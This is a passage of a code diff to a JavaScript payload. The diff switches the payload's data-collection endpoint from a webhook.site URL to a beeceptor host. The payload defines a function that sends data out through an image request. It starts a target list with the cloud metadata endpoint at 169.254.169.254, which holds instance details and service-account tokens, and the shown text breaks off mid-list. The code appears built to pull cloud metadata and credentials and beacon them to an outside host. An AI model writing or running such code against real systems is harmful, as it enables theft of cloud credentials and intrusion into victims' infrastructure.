@@ -1,4 +1,4 @@
-var wh="https://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476";
+var wh="https://wetakush.free.beeceptor.com";
 function x(l,d){new Image().src=wh+"/s-"+l+"?d="+encodeURIComponent(d.substring(0,1500));}
 var t=[
 ["meta","http://169.254.169.254/computeMetadata/v1/?recursive=true"],
